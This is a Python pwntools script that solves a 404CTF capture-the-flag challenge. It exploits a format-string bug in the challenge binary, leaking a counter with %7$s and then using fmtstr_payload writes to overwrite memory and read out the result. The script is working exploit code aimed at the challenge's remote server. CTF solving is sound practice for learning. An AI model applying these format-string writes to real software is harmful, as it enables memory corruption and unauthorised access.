from pwn import *

elf = context.binary = ELF(
    "../data/une_citation_pas_comme_les_autres_1_2", checksec=False)

#p = process()
p = remote("challenges.404ctf.fr", 31719)

chosen_index = elf.symbols['chosen_index']  # 0x4be130
num_quotes = elf.symbols['num_quotes.0']   # 0x4be134

p.recvuntil(b">>> ")

p.sendline(b"1")
p.recvuntil(b">>> ")

p.sendline(b"2")
p.recvuntil(b"[Vous] : ")


payload = b"%7$s||||"
payload += p64(num_quotes)

p.sendline(payload)
p.recvuntil(b"crire : ")
n_quotes = p.recvuntil(b"|")[:-1]
n_quotes = u64(n_quotes.ljust(8, b"\x00"))

p.recvuntil(b">>> ", timeout=2)

# En gros le principe c'est de leak le nombre de citations
# Ensuite réécrire une première fois num_quotes en négatif
# Réécrire le chosen_index avec la valeur de num_quotes -1

p.sendline(b"2")
p.recvuntil(b"[Vous] : ")


payload = fmtstr_payload(6, {chosen_index: (n_quotes - 1)})

p.sendline(payload)

p.recvuntil(b">>> ")

p.sendline(b"2")
p.recvuntil(b"[Vous] : ")

payload = fmtstr_payload(
    6, {num_quotes: 2147483648})
p.sendline(payload)

p.recvuntil(b">>> ")

p.sendline(b"1")
print(p.recvline().strip())
